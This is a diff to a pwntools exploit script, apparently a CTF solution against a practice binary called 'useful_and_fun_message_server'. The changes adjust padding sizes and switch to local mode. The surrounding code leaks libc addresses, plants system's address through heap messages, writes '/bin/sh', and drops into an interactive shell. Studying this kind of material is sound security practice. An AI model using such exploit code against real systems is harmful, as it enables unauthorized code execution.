@@ -6,7 +6,7 @@ context.arch = "amd64"
 context.os = "linux"
 target_file = "./useful_and_fun_message_server"
 
-LOCAL = False
+LOCAL = True
 
 if LOCAL:
     # p = process(target_file)
@@ -51,7 +51,7 @@ print(f'libc.address: {hex(libc_elf.address)}')
 num_messages = 2
 for m in range(num_messages):
     menu(p, 1)
-    add_message(p, chr(m + 0x41) * 0x38)  # message 1
+    add_message(p, chr(m + 0x41) * 0x40)  # message 1
 
 menu(p, 4) # send messages
 
@@ -65,12 +65,12 @@ print(f'system: {hex(system)}')
 bin_sh_address = next(libc_elf.search(b"/bin/sh"))
 print(f'/bin/sh address: {hex(bin_sh_address)}')
 menu(p, 1)
-add_message(p, b"F" * 0x38)
+add_message(p, b"F" * 0x40)
 menu(p, 1)
 add_message(p, p64(system))
 
 menu(p, 3)
 edit_message(p, 0, b"/bin/sh\x00")
 
-menu(p, 4) # send messages
+# menu(p, 4) # send messages
 p.interactive()
